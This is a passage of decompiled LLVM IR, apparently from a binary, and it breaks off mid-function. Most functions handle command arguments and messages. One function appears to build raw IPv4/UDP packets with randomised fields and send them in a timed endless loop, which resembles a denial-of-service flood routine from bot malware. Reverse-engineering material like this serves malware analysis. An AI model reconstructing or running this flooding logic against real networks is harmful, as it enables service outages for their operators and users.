  %v0_9918 = call i32 @function_f670()
  %tmp = icmp ult i32 %v0_9918, 255
  br i1 %tmp, label %dec_label_pc_993c, label %dec_label_pc_9928

dec_label_pc_9928:                                ; preds = %dec_label_pc_9908
  store i32 %arg2, i32* @r2, align 4
  %v3_9934 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_18c3c.78 to i32))
  br label %dec_label_pc_997c

dec_label_pc_993c:                                ; preds = %dec_label_pc_9908
  store i8 1, i8* bitcast (i8** @global_var_2323c.8 to i8*), align 4
  store i32 256, i32* @r2, align 4
  %v3_9954 = call i32 @function_f5d0(i8* bitcast (i32* @global_var_25898.80 to i8*), i32 0)
  %v2_9960 = load i32, i32* %v1_9910, align 4
  store i32 %v2_9960, i32* @r1, align 4
  %v3_996c = call i32 @function_f8ec(i8* bitcast (i32* @global_var_25898.80 to i8*), i32 %v2_9960)
  %v3_9978 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_18c64.82 to i32))
  br label %dec_label_pc_997c

dec_label_pc_997c:                                ; preds = %dec_label_pc_9928, %dec_label_pc_98f4, %dec_label_pc_9898, %dec_label_pc_993c
  %v1_9984 = phi i32 [ %v3_9934, %dec_label_pc_9928 ], [ %v3_9900, %dec_label_pc_98f4 ], [ %v3_98dc, %dec_label_pc_9898 ], [ %v3_9978, %dec_label_pc_993c ]
  ret i32 %v1_9984

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32 %arg1, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_997c, { 3, 0, 1, 2 }
}

define i32 @function_99ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_99ac:
  %stack_var_-4 = alloca i32, align 4
  store i32 39352, i32* %stack_var_-4, align 4
  %v2_99b4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_99b4, i32* @fp, align 4
  %v7_99d0 = icmp eq i32 %arg3, 1
  br i1 %v7_99d0, label %dec_label_pc_9a24, label %dec_label_pc_99d8

dec_label_pc_99d8:                                ; preds = %dec_label_pc_99ac
  store i32 %arg2, i32* @r2, align 4
  %v3_99e4 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_18c84.84 to i32))
  store i32 %arg2, i32* @r2, align 4
  %v3_9a1c = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_18bf8.74 to i32))
  br label %dec_label_pc_9a9c

dec_label_pc_9a24:                                ; preds = %dec_label_pc_99ac
  %v2_9a28 = load i8, i8* bitcast (i8** @global_var_2323c.8 to i8*), align 4
  %v2_9a2c = icmp eq i8 %v2_9a28, 0
  br i1 %v2_9a2c, label %dec_label_pc_9a34, label %dec_label_pc_9a48

dec_label_pc_9a34:                                ; preds = %dec_label_pc_9a24
  store i32 %arg2, i32* @r2, align 4
  %v3_9a40 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_18ca0.90 to i32))
  br label %dec_label_pc_9a9c

dec_label_pc_9a48:                                ; preds = %dec_label_pc_9a24
  %v1_9a4c = add i32 %arg4, 4
  %v1_9a50 = inttoptr i32 %v1_9a4c to i32*
  %v2_9a50 = load i32, i32* %v1_9a50, align 4
  %v3_9a5c = call i32 @function_fa14(i8* bitcast (i32* @global_var_25898.80 to i8*), i32 %v2_9a50)
  %v2_9a64 = icmp eq i32 %v3_9a5c, 0
  br i1 %v2_9a64, label %dec_label_pc_9a80, label %dec_label_pc_9a6c

dec_label_pc_9a6c:                                ; preds = %dec_label_pc_9a48
  store i32 %arg2, i32* @r2, align 4
  %v3_9a78 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_18cc0.93 to i32))
  br label %dec_label_pc_9a9c

dec_label_pc_9a80:                                ; preds = %dec_label_pc_9a48
  store i8 0, i8* bitcast (i8** @global_var_2323c.8 to i8*), align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_9a98 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_18cdc.95 to i32))
  br label %dec_label_pc_9a9c

dec_label_pc_9a9c:                                ; preds = %dec_label_pc_9a6c, %dec_label_pc_9a34, %dec_label_pc_99d8, %dec_label_pc_9a80
  %v1_9aa4 = phi i32 [ %v3_9a78, %dec_label_pc_9a6c ], [ %v3_9a40, %dec_label_pc_9a34 ], [ %v3_9a1c, %dec_label_pc_99d8 ], [ %v3_9a98, %dec_label_pc_9a80 ]
  ret i32 %v1_9aa4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 4, 0, 1 }
  uselistorder i32 %arg1, { 3, 2, 4, 0, 1 }
  uselistorder label %dec_label_pc_9a9c, { 3, 0, 1, 2 }
}

define i32 @function_9acc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9acc:
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-312 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_9acc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_9acc, i32* @ip, align 4
  store i32 39640, i32* %stack_var_-4, align 4
  %v2_9ad4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9ad4, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-312, align 4
  %v7_9af0 = icmp eq i32 %arg3, 1
  br i1 %v7_9af0, label %dec_label_pc_9b24, label %dec_label_pc_9af8

dec_label_pc_9af8:                                ; preds = %dec_label_pc_9acc
  store i32 %arg2, i32* @r2, align 4
  %v3_9b04 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_18cfc.97 to i32))
  store i32 0, i32* bitcast (i8** @global_var_23240.18 to i32*), align 4
  store i32 0, i32* @global_var_23244.20, align 4
  br label %dec_label_pc_9cf8

dec_label_pc_9b24:                                ; preds = %dec_label_pc_9acc
  %v1_9b28 = add i32 %arg4, 4
  %v1_9b2c = inttoptr i32 %v1_9b28 to i32*
  %v2_9b2c = load i32, i32* %v1_9b2c, align 4
  store i32 %v2_9b2c, i32* @r0, align 4
  %v0_9b34 = call i32 @function_f670()
  %tmp = icmp ult i32 %v0_9b34, 17
  br i1 %tmp, label %dec_label_pc_9b58, label %dec_label_pc_9b44

dec_label_pc_9b44:                                ; preds = %dec_label_pc_9b24
  store i32 %arg2, i32* @r2, align 4
  %v3_9b50 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_18d1c.101 to i32))
  br label %dec_label_pc_9cf8

dec_label_pc_9b58:                                ; preds = %dec_label_pc_9b24
  %v3_9b58 = load i32, i32* %stack_var_-312, align 4
  %v1_9b5c = add i32 %v3_9b58, 4
  %v1_9b60 = inttoptr i32 %v1_9b5c to i32*
  %v2_9b60 = load i32, i32* %v1_9b60, align 4
  %v2_9b64 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v2_9b60, i32* @r1, align 4
  %v2_9b70 = bitcast i32* %stack_var_-292 to i8*
  %v3_9b70 = call i32 @function_f8ec(i8* %v2_9b70, i32 %v2_9b60)
  store i32 %v2_9b64, i32* @r0, align 4
  %v0_9b7c = call i32 @function_f670()
  %v2_9b90 = ptrtoint i32* %stack_var_-24 to i32
  %v1_9b84 = add i32 %v2_9b90, -1
  %v2_9b94 = add i32 %v1_9b84, %v0_9b7c
  %v2_9b98 = add i32 %v2_9b94, -268
  %v1_9b9c = inttoptr i32 %v2_9b98 to i8*
  %v2_9b9c = load i8, i8* %v1_9b9c, align 1
  %v7_9ba0 = icmp eq i8 %v2_9b9c, 46
  br i1 %v7_9ba0, label %dec_label_pc_9ba8, label %dec_label_pc_9c28

dec_label_pc_9ba8:                                ; preds = %dec_label_pc_9b58
  store i32 %v2_9b64, i32* @r0, align 4
  %v0_9bb0 = call i32 @function_f670()
  %v1_9bb8 = add i32 %v2_9b90, -269
  %v2_9bcc = add i32 %v1_9bb8, %v0_9bb0
  %v3_9bd4 = inttoptr i32 %v2_9bcc to i8*
  store i8 0, i8* %v3_9bd4, align 1
  br label %dec_label_pc_9c28

dec_label_pc_9bec:                                ; preds = %dec_label_pc_9c28
  %v2_9bfc = add i32 %stack_var_-36.0, %v2_9b90
  %v2_9c00 = add i32 %v2_9bfc, -268
  %v1_9c04 = inttoptr i32 %v2_9c00 to i8*
  %v2_9c04 = load i8, i8* %v1_9c04, align 1
  %v7_9c08 = icmp eq i8 %v2_9c04, 46
  br i1 %v7_9c08, label %dec_label_pc_9c10, label %dec_label_pc_9c1c

dec_label_pc_9c10:                                ; preds = %dec_label_pc_9bec
  %v1_9c14 = add i32 %stack_var_-32.1, 1
  br label %dec_label_pc_9c1c

dec_label_pc_9c1c:                                ; preds = %dec_label_pc_9bec, %dec_label_pc_9c10
  %stack_var_-32.0 = phi i32 [ %v1_9c14, %dec_label_pc_9c10 ], [ %stack_var_-32.1, %dec_label_pc_9bec ]
  %v1_9c20 = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_9c28

dec_label_pc_9c28:                                ; preds = %dec_label_pc_9ba8, %dec_label_pc_9b58, %dec_label_pc_9c1c
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.0, %dec_label_pc_9c1c ], [ 1, %dec_label_pc_9b58 ], [ 1, %dec_label_pc_9ba8 ]
  %stack_var_-36.0 = phi i32 [ %v1_9c20, %dec_label_pc_9c1c ], [ 0, %dec_label_pc_9b58 ], [ 0, %dec_label_pc_9ba8 ]
  store i32 %stack_var_-36.0, i32* @r4, align 4
  store i32 %v2_9b64, i32* @r0, align 4
  %v0_9c34 = call i32 @function_f670()
  %v0_9c3c = load i32, i32* @r4, align 4
  %v3_9c3c = icmp ult i32 %v0_9c3c, %v0_9c34
  br i1 %v3_9c3c, label %dec_label_pc_9bec, label %dec_label_pc_9c44

dec_label_pc_9c44:                                ; preds = %dec_label_pc_9c28
  %v1_9c48 = sub i32 4, %stack_var_-32.1
  %v3_9c9823 = icmp eq i32 %v1_9c48, 0
  %v5_9c9c28 = icmp sgt i32 %v1_9c48, 0
  br i1 %v5_9c9c28, label %dec_label_pc_9c5c, label %dec_label_pc_9ca0

dec_label_pc_9c5c:                                ; preds = %dec_label_pc_9c44, %dec_label_pc_9c5c
  %storemerge229 = phi i32 [ %v1_9c88, %dec_label_pc_9c5c ], [ 0, %dec_label_pc_9c44 ]
  store i32 %v2_9b64, i32* @r4, align 4
  store i32 %v2_9b64, i32* @r0, align 4
  %v0_9c68 = call i32 @function_f670()
  %v0_9c70 = load i32, i32* @r4, align 4
  %v2_9c70 = add i32 %v0_9c70, %v0_9c68
  store i32 %v2_9c70, i32* @r3, align 4
  store i32 %v2_9c70, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18d68.103 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  %v0_9c80 = call i32 @function_f700()
  %v1_9c88 = add nuw nsw i32 %storemerge229, 1
  %v5_9c9c = icmp slt i32 %v1_9c88, %v1_9c48
  br i1 %v5_9c9c, label %dec_label_pc_9c5c, label %dec_label_pc_9ca0

dec_label_pc_9ca0:                                ; preds = %dec_label_pc_9c5c, %dec_label_pc_9c44
  store i32 %v2_9b64, i32* @r0, align 4
  %v1_9ca8 = call i32 @function_fcb4(i32 %v2_9b64)
  br i1 %v3_9c9823, label %dec_label_pc_9cec, label %dec_label_pc_9cd0

dec_label_pc_9cd0:                                ; preds = %dec_label_pc_9ca0
  %v2_9cd8 = call i32 @function_8d14(i32 256, i32 %v1_9c48)
  br label %dec_label_pc_9cec

dec_label_pc_9cec:                                ; preds = %dec_label_pc_9ca0, %dec_label_pc_9cd0
  %storemerge = phi i32 [ %v2_9cd8, %dec_label_pc_9cd0 ], [ 1, %dec_label_pc_9ca0 ]
  %v1_9d007 = phi i32 [ %v2_9cd8, %dec_label_pc_9cd0 ], [ %v1_9ca8, %dec_label_pc_9ca0 ]
  store i32 %storemerge, i32* @global_var_23244.20, align 4
  store i32 %v1_9ca8, i32* bitcast (i8** @global_var_23240.18 to i32*), align 4
  br label %dec_label_pc_9cf8

dec_label_pc_9cf8:                                ; preds = %dec_label_pc_9b44, %dec_label_pc_9af8, %dec_label_pc_9cec
  %v1_9d00 = phi i32 [ %v3_9b50, %dec_label_pc_9b44 ], [ %v3_9b04, %dec_label_pc_9af8 ], [ %v1_9d007, %dec_label_pc_9cec ]
  ret i32 %v1_9d00

; uselistorder directives
  uselistorder i32 %v1_9ca8, { 1, 0 }
  uselistorder i32 %v1_9c88, { 1, 0 }
  uselistorder i32 %v1_9c48, { 2, 3, 0, 1 }
  uselistorder i32 %stack_var_-36.0, { 2, 0, 1 }
  uselistorder i32 %stack_var_-32.1, { 0, 2, 1 }
  uselistorder i32 %v2_9b90, { 0, 2, 1 }
  uselistorder i32 %v2_9b64, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8d14, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9cf8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9cec, { 1, 0 }
  uselistorder label %dec_label_pc_9c5c, { 1, 0 }
  uselistorder label %dec_label_pc_9c28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9c1c, { 1, 0 }
}

define i32 @function_9d18(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_9d18:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_9d1c = load i32, i32* @fp, align 4
  store i32 40228, i32* %stack_var_-4, align 4
  %v2_9d20 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9d20, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  store i32 %arg2, i32* @r0, align 4
  %v1_9d34 = call i32 @function_fe00(i32 %arg2)
  store i32 %v1_9d34, i32* @global_var_2364c.105, align 4
  %v3_9d4c = icmp eq i32 %v1_9d34, -1
  br i1 %v3_9d4c, label %dec_label_pc_9d54, label %dec_label_pc_9db8

dec_label_pc_9d54:                                ; preds = %dec_label_pc_9d18
  %v3_9d54 = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_9d54, i32* @r0, align 4
  %v1_9d58 = call i32 @function_fe28(i32 %v3_9d54)
  %v2_9d68 = icmp eq i32 %v1_9d58, 0
  br i1 %v2_9d68, label %dec_label_pc_9d70, label %dec_label_pc_9d94

dec_label_pc_9d70:                                ; preds = %dec_label_pc_9d54
  %v2_9d74 = load i32, i32* @global_var_259a0.10, align 4
  store i32 %arg1, i32* @r2, align 4
  %v3_9d88 = call i32 @function_8398(i32 %v2_9d74, i32 ptrtoint ([33 x i8]* @global_var_18d6c.108 to i32))
  %v1_9d90 = call i32 @function_11bf0(i32 0)
  br label %dec_label_pc_9d94

dec_label_pc_9d94:                                ; preds = %dec_label_pc_9d54, %dec_label_pc_9d70
  %v1_9d98 = add i32 %v1_9d58, 16
  %v2_9d98 = inttoptr i32 %v1_9d98 to i32*
  %v3_9d98 = load i32, i32* %v2_9d98, align 4
  %v1_9d9c = inttoptr i32 %v3_9d98 to i32*
  %v2_9d9c = load i32, i32* %v1_9d9c, align 4
  %v1_9da4 = add i32 %v1_9d58, 12
  %v2_9da4 = inttoptr i32 %v1_9da4 to i32*
  %v3_9da4 = load i32, i32* %v2_9da4, align 4
  store i32 %v3_9da4, i32* @r3, align 4
  store i32 %v3_9da4, i32* @r2, align 4
  %v3_9db4 = call i32 @function_f6d0(i32 %v2_9d9c, i32 ptrtoint (i32* @global_var_2364c.105 to i32), i32 %v3_9da4)
  %v2_9dbc.pre = load i32, i32* @global_var_2364c.105, align 4
  br label %dec_label_pc_9db8

dec_label_pc_9db8:                                ; preds = %dec_label_pc_9d18, %dec_label_pc_9d94
  %v2_9dbc = phi i32 [ %v1_9d34, %dec_label_pc_9d18 ], [ %v2_9dbc.pre, %dec_label_pc_9d94 ]
  store i32 %v3_9d1c, i32* @fp, align 4
  ret i32 %v2_9dbc

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* @global_var_2364c.105, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9db8, { 1, 0 }
  uselistorder label %dec_label_pc_9d94, { 1, 0 }
}

define i32 @function_9ddc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9ddc:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-1544 = alloca i32, align 4
  %stack_var_-1552 = alloca i32, align 4
  %stack_var_-1572 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 40424, i32* %stack_var_-4, align 4
  %v2_9de4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9de4, i32* @fp, align 4
  %v2_9e08 = call i32 @function_ced8(i32* null)
  %v1_9e18 = call i32 @function_8400(i32 %arg2)
  %v2_9e20 = icmp eq i32 %v1_9e18, 0
  br i1 %v2_9e20, label %dec_label_pc_9e28, label %dec_label_pc_a170

dec_label_pc_9e28:                                ; preds = %dec_label_pc_9ddc
  %v3_9e34 = call i32 @function_10044(i32 2, i32 3, i32 255)
  %v1_9e44 = icmp slt i32 %v3_9e34, 0
  br i1 %v1_9e44, label %dec_label_pc_9e4c, label %dec_label_pc_9e54

dec_label_pc_9e4c:                                ; preds = %dec_label_pc_9e28
  %v1_9e50 = call i32 @function_11bf0(i32 1)
  br label %dec_label_pc_9e54

dec_label_pc_9e54:                                ; preds = %dec_label_pc_9e28, %dec_label_pc_9e4c
  %v8_9e5c = icmp sgt i32 %arg3, 2
  br i1 %v8_9e5c, label %dec_label_pc_9e78, label %dec_label_pc_9e60

dec_label_pc_9e60:                                ; preds = %dec_label_pc_9e54
  store i32 %arg2, i32* @r2, align 4
  %v3_9e6c = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_18d90.110 to i32))
  %v1_9e74 = call i32 @function_11bf0(i32 1)
  br label %dec_label_pc_9e78

dec_label_pc_9e78:                                ; preds = %dec_label_pc_9e54, %dec_label_pc_9e60
  %v1_9e7c = add i32 %arg4, 4
  %v1_9e80 = inttoptr i32 %v1_9e7c to i32*
  %v2_9e80 = load i32, i32* %v1_9e80, align 4
  %v2_9e8c = call i32 @function_9d18(i32 %arg2, i32 %v2_9e80)
  %v1_9e9c = add i32 %arg4, 8
  %v1_9ea0 = inttoptr i32 %v1_9e9c to i32*
  %v2_9ea0 = load i32, i32* %v1_9ea0, align 4
  store i32 %v2_9ea0, i32* @r0, align 4
  %v1_9ea8 = call i32 @function_119f4(i32 %v2_9ea0)
  %v1_9eb8 = add i32 %arg4, 12
  %v1_9ebc = inttoptr i32 %v1_9eb8 to i32*
  %v2_9ebc = load i32, i32* %v1_9ebc, align 4
  store i32 %v2_9ebc, i32* @r0, align 4
  %v1_9ec4 = call i32 @function_119f4(i32 %v2_9ebc)
  %v2_9ed8 = ptrtoint i32* %stack_var_-1572 to i32
  %tmp39 = bitcast i32* %stack_var_-1572 to i8*
  %tmp40 = bitcast i32* %stack_var_-1552 to i16*
  store i32 1472, i32* @r2, align 4
  %v2_9f14 = bitcast i32* %stack_var_-1544 to i8*
  %v3_9f14 = call i32 @function_f5d0(i8* %v2_9f14, i32 10)
  store i32 %arg2, i32* @r2, align 4
  %v3_9f30 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_18db8.112 to i32))
  store i8 69, i8* %tmp39, align 4
  %v3_9f84 = or i32 %v2_9ed8, 1
  %v4_9f84 = inttoptr i32 %v3_9f84 to i8*
  store i8 0, i8* %v4_9f84, align 1
  %v3_9f94 = or i32 %v2_9ed8, 2
  %v4_9f94 = inttoptr i32 %v3_9f94 to i16*
  store i16 1500, i16* %v4_9f94, align 2
  %v3_9fa0 = add i32 %v2_9ed8, 6
  %v4_9fa0 = inttoptr i32 %v3_9fa0 to i16*
  store i16 0, i16* %v4_9fa0, align 2
  %v3_9fac = add i32 %v2_9ed8, 9
  %v4_9fac = inttoptr i32 %v3_9fac to i8*
  store i8 17, i8* %v4_9fac, align 1
  %v3_9fb8 = add i32 %v2_9ed8, 8
  %v4_9fb8 = inttoptr i32 %v3_9fb8 to i8*
  store i8 64, i8* %v4_9fb8, align 4
  %v2_9fc4 = add i32 %v2_9ed8, 16
  %v3_9fc4 = inttoptr i32 %v2_9fc4 to i32*
  store i32 %v2_9e8c, i32* %v3_9fc4, align 4
  %v3_9fd0 = urem i32 %tmp11, 65536
  %v1_9fd8 = call i32 @function_fc54(i32 %v3_9fd0)
  %sext = mul i32 %v1_9fd8, 65536
  %v1_9fdc = sdiv i32 %sext, 65536
  %v4_9fe4 = ptrtoint i32* %stack_var_-1552 to i32
  %v1_9fe8 = trunc i32 %v1_9fdc to i16
  %v3_9fe8 = add i32 %v4_9fe4, 4
  %v4_9fe8 = inttoptr i32 %v3_9fe8 to i16*
  store i16 %v1_9fe8, i16* %v4_9fe8, align 4
  store i32 2, i32* %stack_var_-72, align 4
  %v2_a018 = icmp eq i32 %v1_9ea8, 0
  %v3_a05c = or i32 %v4_9fe4, 2
  %v4_a05c = inttoptr i32 %v3_a05c to i16*
  %v2_a078 = bitcast i32* %stack_var_-1572 to i16*
  %v3_a088 = add i32 %v4_9fe4, 6
  %v4_a088 = inttoptr i32 %v3_a088 to i16*
  %v2_a098 = add i32 %v2_9ed8, 12
  %v3_a098 = inttoptr i32 %v2_a098 to i32*
  %v3_a0b0 = add i32 %v2_9ed8, 4
  %v4_a0b0 = inttoptr i32 %v3_a0b0 to i16*
  %v3_a0dc = add i32 %v2_9ed8, 10
  %v4_a0dc = inttoptr i32 %v3_a0dc to i16*
  %v2_a0ec = ptrtoint i32* %stack_var_-72 to i32
  %v2_a144 = add i32 %v1_9ec4, %v2_9e08
  %v3_a028 = urem i32 %v1_9ea8, 65536
  br label %dec_label_pc_9ffc

dec_label_pc_9ffc:                                ; preds = %dec_label_pc_a160, %dec_label_pc_9e78
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_9e78 ], [ %v1_a164, %dec_label_pc_a160 ]
  %v0_9ffc = call i32 @function_113ec()
  %v1_a010 = trunc i32 %v0_9ffc to i16
  store i16 %v1_a010, i16* %tmp40, align 4
  br i1 %v2_a018, label %dec_label_pc_a048, label %dec_label_pc_a020

dec_label_pc_a020:                                ; preds = %dec_label_pc_9ffc
  %v1_a030 = call i32 @function_fc54(i32 %v3_a028)
  %sext3 = mul i32 %v1_a030, 65536
  %v1_a034 = sdiv i32 %sext3, 65536
  %extract.t = trunc i32 %v1_a034 to i16
  br label %dec_label_pc_a060

dec_label_pc_a048:                                ; preds = %dec_label_pc_9ffc
  %v0_a048 = call i32 @function_113ec()
  %extract.t47 = trunc i32 %v0_a048 to i16
  br label %dec_label_pc_a060

dec_label_pc_a060:                                ; preds = %dec_label_pc_a020, %dec_label_pc_a048
  %v1_a034.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_a020 ], [ %extract.t47, %dec_label_pc_a048 ]
  store i16 %v1_a034.sink.off0, i16* %v4_a05c, align 2
  %v3_a078 = call i32 @function_8d94(i16* %v2_a078, i32 1500)
  %sext4 = mul i32 %v3_a078, 65536
  %v1_a07c = sdiv i32 %sext4, 65536
  %v1_a088 = trunc i32 %v1_a07c to i16
  store i16 %v1_a088, i16* %v4_a088, align 2
  %v0_a08c = call i32 @function_8570()
  store i32 %v0_a08c, i32* %v3_a098, align 4
  %v0_a09c = call i32 @function_113ec()
  %v1_a0b0 = trunc i32 %v0_a09c to i16
  store i16 %v1_a0b0, i16* %v4_a0b0, align 4
  %v3_a0cc = call i32 @function_8d94(i16* %v2_a078, i32 1500)
  %v1_a0dc = trunc i32 %v3_a0cc to i16
  store i16 %v1_a0dc, i16* %v4_a0dc, align 2
  %v6_a11c = call i32 @function_ffc0(i32 %v3_9e34, i32 %v2_9ed8, i32 1500, i32 0, i32 %v2_a0ec, i32 16)
  %tmp = icmp ult i32 %stack_var_-52.0, 50
  br i1 %tmp, label %dec_label_pc_a160, label %dec_label_pc_a12c

dec_label_pc_a12c:                                ; preds = %dec_label_pc_a060
  %v2_a130 = call i32 @function_ced8(i32* null)
  %v3_a148 = icmp ult i32 %v2_a130, %v2_a144
  br i1 %v3_a148, label %dec_label_pc_a158, label %dec_label_pc_a150

dec_label_pc_a150:                                ; preds = %dec_label_pc_a12c
  %v1_a154 = call i32 @function_11bf0(i32 0)
  br label %dec_label_pc_a158

dec_label_pc_a158:                                ; preds = %dec_label_pc_a12c, %dec_label_pc_a150
  br label %dec_label_pc_a160

dec_label_pc_a160:                                ; preds = %dec_label_pc_a060, %dec_label_pc_a158
  %stack_var_-52.1 = phi i32 [ %stack_var_-52.0, %dec_label_pc_a060 ], [ 0, %dec_label_pc_a158 ]
  %v1_a164 = add i32 %stack_var_-52.1, 1
  br label %dec_label_pc_9ffc

dec_label_pc_a170:                                ; preds = %dec_label_pc_9ddc
  ret i32 %v1_9e18

; uselistorder directives
  uselistorder i32 %stack_var_-52.0, { 1, 0 }
  uselistorder i32 %v2_9ed8, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a160, { 1, 0 }
  uselistorder label %dec_label_pc_a158, { 1, 0 }
  uselistorder label %dec_label_pc_a060, { 1, 0 }
  uselistorder label %dec_label_pc_9e78, { 1, 0 }
  uselistorder label %dec_label_pc_9e54, { 1, 0 }
}

define i32 @function_a184(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a184:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-116 = alloca i8, align 1
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a188 = load i32, i32* @fp, align 4
  store i32 %v3_a188, i32* %stack_var_-16, align 4
  store i32 41360, i32* %stack_var_-4, align 4
  %v13_a188 = ptrtoint i32* %stack_var_-16 to i32
  %v2_a18c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a18c, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_18dd4.114 to i32), i32* @r3, align 4
  %v2_a1a8 = ptrtoint i32* %stack_var_-264 to i32
  store i32 80, i32* @ip, align 4
  store i32 %v2_a1a8, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_18dd4.114 to i32), i32* @r1, align 4
  store i32 80, i32* @r2, align 4
  %v0_a1bc = call i32 @function_f700()
  %v2_a1d4 = call i32 @function_ced8(i32* null)
  %v1_a1e4 = call i32 @function_8400(i32 %arg2)
  %v2_a1ec = icmp eq i32 %v1_a1e4, 0
  br i1 %v2_a1ec, label %dec_label_pc_a1f4, label %dec_label_pc_a73c

dec_label_pc_a1f4:                                ; preds = %dec_label_pc_a184
  %v8_a1fc = icmp sgt i32 %arg3, 2
  br i1 %v8_a1fc, label %dec_label_pc_a218, label %dec_label_pc_a200

dec_label_pc_a200:                                ; preds = %dec_label_pc_a1f4
  store i32 %arg2, i32* @r2, align 4
  %v3_a20c = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_18e24.116 to i32))
  %v1_a214 = call i32 @function_11bf0(i32 1)
  br label %dec_label_pc_a218

dec_label_pc_a218:                                ; preds = %dec_label_pc_a1f4, %dec_label_pc_a200
  %v3_a224 = call i32 @function_10044(i32 2, i32 3, i32 255)
  %v1_a234 = icmp slt i32 %v3_a224, 0
  br i1 %v1_a234, label %dec_label_pc_a23c, label %dec_label_pc_a298.preheader

dec_label_pc_a23c:                                ; preds = %dec_label_pc_a218
  %v1_a240 = call i32 @function_11bf0(i32 1)
  br label %dec_label_pc_a298.preheader

dec_label_pc_a298.preheader:                      ; preds = %dec_label_pc_a218, %dec_label_pc_a23c
  %v2_a264 = add i32 %v13_a188, -248
  %v2_a27c = add i32 %v13_a188, -60
  br label %dec_label_pc_a250

dec_label_pc_a250:                                ; preds = %dec_label_pc_a298.preheader, %dec_label_pc_a250
  %storemerge1112 = phi i32 [ 0, %dec_label_pc_a298.preheader ], [ %v1_a290, %dec_label_pc_a250 ]
  %v3_a25c = mul nuw nsw i32 %storemerge1112, 4
  %v2_a268 = add i32 %v2_a264, %v3_a25c
  %v1_a26c = inttoptr i32 %v2_a268 to i32*
  %v2_a26c = load i32, i32* %v1_a26c, align 4
  %v2_a280 = add i32 %v2_a27c, %storemerge1112
  %v1_a288 = trunc i32 %v2_a26c to i8
  %v3_a288 = inttoptr i32 %v2_a280 to i8*
  store i8 %v1_a288, i8* %v3_a288, align 1
  %v1_a290 = add nuw nsw i32 %storemerge1112, 1
  %v7_a2a0 = icmp slt i32 %v1_a290, 20
  br i1 %v7_a2a0, label %dec_label_pc_a250, label %dec_label_pc_a2a4

dec_label_pc_a2a4:                                ; preds = %dec_label_pc_a250
  %v1_a2a8 = add i32 %arg4, 4
